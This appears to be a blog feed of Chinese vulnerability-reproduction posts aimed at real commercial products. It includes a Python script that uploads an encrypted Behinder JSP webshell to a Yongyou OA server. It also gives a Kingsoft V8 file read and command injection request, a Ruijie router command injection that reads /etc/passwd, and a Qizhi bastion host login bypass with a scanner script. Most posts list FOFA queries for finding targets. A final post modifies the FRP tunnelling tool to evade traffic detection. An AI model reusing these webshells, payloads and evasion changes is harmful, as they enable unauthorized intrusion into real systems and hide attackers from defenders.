class="hljs-string">&quot;t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 正在请求：&#123;&#125;\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(vuln_url))<br>        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 木马上传成功, 路径为:&#123;&#125;/yyoa/&#123;&#125;\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url, rebe_webshell))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[o] 请使用冰蝎连接，密码为: rebeyond\033[0m&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 木马上传失败，可能被拦截 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url), e)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    title()<br>    target_url = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))<br>    POC_1(target_url)<br></code></pre></td></tr></table></figure><p>Reference：</p><p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BNCCloudFS%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86SQL%E6%B3%A8%E5%85%A5.html">http://wiki.peiqi.tech/PeiQi_Wiki/OA产品漏洞/用友OA/用友NCCloudFS文件管理SQL注入.html</a></p><p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">http://wiki.peiqi.tech/PeiQi_Wiki/OA产品漏洞/用友OA/用友 U8 OA test.jsp SQL注入漏洞.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kingsoft-V8-vulnerability</title>
    <link href="/posts/6b98c3b0.html"/>
    <url>/posts/6b98c3b0.html</url>
    
    <content type="html"><![CDATA[<h3 id="金山-V8-終端安全系统任意文件读取漏洞">金山 V8 終端安全系统任意文件读取漏洞</h3><p>FOFA</p><p><code>title=&quot;在线安装-V8+终端安全系统Web控制台&quot;</code></p><p>POC</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xxx.xxx.xxx.xxx<span class="hljs-regexp">/htmltopdf/</span>downfile.php?filename=downfile.php<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/07/13/WFHozn.png" alt=""></p><h3 id="金山V8-终端安全系统命令执行漏洞">金山V8 终端安全系统命令执行漏洞</h3><p>​原文：<a href="https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA">https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA</a></p><p><img src="https://z3.ax1x.com/2021/07/13/WFH7Mq.png" alt=""></p><p>漏洞位置：</p><p><code>http://xxx.xxx.xxx.xxx//inter/pdf_maker.php</code></p><p>FOFA</p><p><code>title=&quot;在线安装-V8+终端安全系统Web控制台&quot;</code></p><p>验证</p><p><a href="http://x.x.x.x/inter/pdf_maker.php">http://x.x.x.x/inter/pdf_maker.php</a></p><p>url值为经过base64编码后的 <code>&quot;|| whoami ||</code></p><p><img src="https://z3.ax1x.com/2021/07/13/WFH5Gj.png" alt=""></p><p>请求包如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST /inter/pdf_maker.php HTTP/1.1<br>Host: x.x.x.x.x<br>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0; en_US) Gecko/20100101 Firefox/87.0<br>Accept: image/webp,*/*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>DNT: 1<br>Connection: close<br>Cookie: PHPSESSID=ic3v6dkhmff0ljn7pgusad43s0<br>X-Forwarded-For: 110.110.110.110<br>X-Originating-IP: 110.110.110.110<br>X-Remote-IP: 110.110.110.110<br>X-Remote-Addr: 110.110.110.110<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 39<br><br>url=Inx8IHdob2FtaSB8fA==&amp;fileName=xxx<br></code></pre></td></tr></table></figure><p>看看连接情况：</p><p><img src="https://z3.ax1x.com/2021/07/13/WFHIRs.png" alt=""></p><p>Reference</p><p><a href="https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA">https://mp.weixin.qq.com/s/eQtyY3B8jwVL_n0FaGpQlA</a></p><p><a href="https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20pdf_maker.php%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md">https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web应用漏洞/金山/金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞.md</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ruijie-NBR-router-RCE</title>
    <link href="/posts/43bd18b.html"/>
    <url>/posts/43bd18b.html</url>
    
    <content type="html"><![CDATA[<p>锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650</p><p>HW漏洞，锐捷NBR路由器 EWEB网管系统部分接口存在命令注入</p><p>验证</p><p>fofa  <code>title=&quot;锐捷网络-EWEB网管系统&quot;</code> 或者 <code>icon_hash=&quot;-692947551&quot;</code></p><p>登录页面这样子：</p><p><img src="https://z3.ax1x.com/2021/07/13/WFHRZ8.png" alt=""></p><p>出现漏洞的文件在 <code>/guest_auth/guestIsUp.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//查询用户是否上线了</span><br>    <span class="hljs-variable">$userip</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$usermac</span> = @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mac&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$userip</span> || !<span class="hljs-variable">$usermac</span>) &#123;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    <span class="hljs-comment">/* 判断该用户是否已经放行 */</span><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;/sbin/app_auth_hook.elf -f &#x27;</span> . <span class="hljs-variable">$userip</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$out</span>, <span class="hljs-variable">$status</span>);<br>    <span class="hljs-comment">/* 如果已经上线成功 */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$out</span>[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;status:1&quot;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;true&#x27;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以通过命令拼接的方式构造命令执行，如：<code>ip=127.0.01 | cat /etc/passwd</code></p><p><img src="https://z3.ax1x.com/2021/07/13/WFHWdS.png" alt=""></p><p>Reference</p><p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%320EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650.html">http://wiki.peiqi.tech/PeiQi_Wiki/网络设备漏洞/锐捷/锐捷NBR路由器20EWEB网管系统 远程命令执行漏洞 CNVD-2021-09650.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>齐治堡垒机任意用户登录</title>
    <link href="/posts/f8593b1e.html"/>
    <url>/posts/f8593b1e.html</url>
    
    <content type="html"><![CDATA[<h3 id="齐治堡垒机存在任意用户登录漏洞">齐治堡垒机存在任意用户登录漏洞</h3><p>齐治堡垒机存在任意用户登录漏洞，访问特定的URL即可获得后台权限</p><h3 id="验证">验证</h3><p>fofa  <code>app=&quot;齐治科技-堡垒机&quot;</code></p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&amp;id=%5C&amp;uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&amp;login=shterm<br></code></pre></td></tr></table></figure><p><code>shterm</code> 为缺省管理员账户。</p><p>审计员：</p><p><img src="https://z3.ax1x.com/2021/07/13/WF7zKP.png" alt=""></p><p>切换超管角色：</p><p><img src="https://z3.ax1x.com/2021/07/13/WFHpb8.png" alt=""></p><p>PY脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests,sys,re,urllib3<br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><span class="hljs-comment"># for url in  open(&quot;C:/1.txt&quot;,&quot;r&quot;):</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]Use: pyhton3 齐治科技-堡垒机.py http://ip:port&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]Explain: HADESI&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]============================&quot;</span>)<br>        sys.exit()<br><br>url=sys.argv[<span class="hljs-number">1</span>]<br>url1=url+<span class="hljs-string">&quot;/audit/gui_detail_view.php?token=1&amp;id=%5C&amp;uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&amp;login=shterm&quot;</span><br><br>res = requests.get(url=url1,verify=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># print (res.status_code)</span><br><span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span> :<br>    <span class="hljs-built_in">print</span>(url1+<span class="hljs-string">&quot;&gt;&gt;&gt;&gt;&gt;漏洞存在&quot;</span>)<br></code></pre></td></tr></table></figure><p>Reference</p><p><a href="https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md">https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web应用漏洞/齐治堡垒机/齐治堡垒机 任意用户登录漏洞.md</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修改FRP</title>
    <link href="/posts/f3a0015a.html"/>
    <url>/posts/f3a0015a.html</url>
    
    <content type="html"><![CDATA[<h3 id="环境">环境</h3><p>Platform：Kali Linux</p><p>Editor：IEDA（Golang）</p><p>Go Version：Go1.16</p><hr /><p>下载master分支源码，建议通过git clone方式。IEDA打开。<a href="https://github.com/fatedier/frp/tree/master">https://github.com/fatedier/frp/tree/master</a></p><p>注：以下使用的frp版本0.36.2的源码，其他版理论上也是可以用的。</p><h3 id="改改标识">改改标识</h3><p>全局查找替换：<code>json:&quot;</code>，可自行替换为其他字符。</p><p><img src="https://z3.ax1x.com/2021/05/14/grkStH.png" alt=""></p><h3 id="修改默认加密salt">修改默认加密salt</h3><p><code>cmd/frpc/main.go</code>、<code>cmd/frps/main.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>crypto.DefaultSalt = <span class="hljs-string">&quot;sc.frp&quot;</span><br>rand.Seed(time.Now().UnixNano())<br><br>sub.Execute()<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grFv7D.png" alt=""></p><h3 id="修改tls协议默认特征">修改tls协议默认特征</h3><p><code>pkg/util/net/tls.go</code></p><p>不好截图，直接上代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> net<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;crypto/tls&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br><br>gnet <span class="hljs-string">&quot;github.com/fatedier/golib/net&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>FRPTLSHeadByte = <span class="hljs-number">0x10</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WrapTLSClientConn</span><span class="hljs-params">(c net.Conn, tlsConfig *tls.Config)</span></span> (out net.Conn) &#123;<br>c.Write([]<span class="hljs-type">byte</span>&#123;<span class="hljs-type">byte</span>(FRPTLSHeadByte), <span class="hljs-type">byte</span>(<span class="hljs-number">0x61</span>), <span class="hljs-type">byte</span>(<span class="hljs-number">0x62</span>)&#125;)<br>out = tls.Client(c, tlsConfig)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CheckAndEnableTLSServerConnWithTimeout</span><span class="hljs-params">(c net.Conn, tlsConfig *tls.Config, tlsOnly <span class="hljs-type">bool</span>, timeout time.Duration)</span></span> (out net.Conn, err <span class="hljs-type">error</span>) &#123;<br>sc, r := gnet.NewSharedConnSize(c, <span class="hljs-number">4</span>)<br>buf := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">3</span>)<br><span class="hljs-keyword">var</span> n <span class="hljs-type">int</span><br>c.SetReadDeadline(time.Now().Add(timeout))<br>n, err = r.Read(buf)<br>c.SetReadDeadline(time.Time&#123;&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> n == <span class="hljs-number">3</span> &amp;&amp; <span class="hljs-type">int</span>(buf[<span class="hljs-number">0</span>]) == FRPTLSHeadByte &#123;<br>out = tls.Server(c, tlsConfig)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> tlsOnly &#123;<br>err = fmt.Errorf(<span class="hljs-string">&quot;non-TLS connection received on a TlsOnly server&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>out = sc<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="修改websocket连接特征">修改websocket连接特征</h3><p>这一步可忽略，就当前来说websocket不常用。</p><p><code>pkg/util/net/websocket.go</code> 19行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>FrpWebsocketPath = <span class="hljs-string">&quot;/login/?src=pcw_home&amp;destUrl=https://www.360.cn&quot;</span><br>)<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/05/14/grFzAe.png" alt=""></p><h3 id="WSS加域前置？">WSS加域前置？</h3><p>改了编译不出来，全是报错？暂时放弃。</p><h3 id="修改读写逻辑，异或混淆字符">修改读写逻辑，异或混淆字符</h3><p><code>pkg/msg/ctl.go</code></p><p>注：感觉原文 <a href="https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2">https://www.notion.so/FRP-d3673da19ec74a8781c020bbea883fa2</a></p><p>这部分的代码没给全，编译后的frp使用有问题，连接不了…   <strong>后面还是得用原来的，不做修改。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> msg<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br><br>jsonMsg <span class="hljs-string">&quot;github.com/fatedier/golib/msg/json&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Message = jsonMsg.Message<br><br><span class="hljs-keyword">var</span> (<br>msgCtl *jsonMsg.MsgCtl<br>xor= <span class="hljs-type">byte</span>(<span class="hljs-number">0xaa</span>)<br>typeMap = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">byte</span>]reflect.Type)<br>maxMsgLength <span class="hljs-type">int64</span> = <span class="hljs-number">10240</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">bytesXor</span><span class="hljs-params">(buffer []<span class="hljs-type">byte</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> buffer &#123;<br>buffer[i] = v ^ xor<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">readMsg</span><span class="hljs-params">(c io.Reader)</span></span> (typeByte <span class="hljs-type">byte</span>, buffer []<span class="hljs-type">byte</span>, err <span class="hljs-type">error</span>) &#123;<br>buffer = <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">1</span>)<br>_, err = c.Read(buffer)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>typeByte = buffer[<span class="hljs-number">0</span>] ^ xor<br><span class="hljs-keyword">if</span> _, ok := typeMap[typeByte]; !ok &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">var</span> _ <span class="hljs-type">int64</span><br>buffer = <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">8</span>)<br>c.Read(buffer)<br>bytesXor(buffer)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>msgCtl = jsonMsg.NewMsgCtl()<br><span class="hljs-keyword">for</span> typeByte, msg := <span class="hljs-keyword">range</span> msgTypeMap &#123;<br>msgCtl.RegisterMsg(typeByte, msg)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadMsg</span><span class="hljs-params">(c io.Reader)</span></span> (msg Message, err <span class="hljs-type">error</span>) &#123;<br>typeByte, buffer, err := readMsg(c)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span> msgCtl.UnPack(typeByte, buffer)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadMsgInto</span><span class="hljs-params">(c io.Reader, msg Message)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>_, buffer, err := readMsg(c)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span> msgCtl.UnPackInto(buffer, msg)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WriteMsg</span><span class="hljs-params">(c io.Writer, msg <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>buffer, err := msgCtl.Pack(msg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>bytesXor(buffer)<br><span class="hljs-keyword">if</span> _, err = c.Write(buffer); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="编译打包">编译打包</h3><p>只编译当前平台frp：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf ./release/packages<br><span class="hljs-built_in">mkdir</span> -p ./release/packages<br>go build -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> -o ./release/frpc ./cmd/frpc<br>go build -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> -o ./release/frps ./cmd/frps<br></code></pre></td></tr></table></figure><p>交叉编译常用平台，以下只编译Win、Mac、Linux x86和x64。</p><p><code>package.sh</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># compile for version</span><br>make<br><span class="hljs-keyword">if</span> [ $? -ne 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;make error&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span 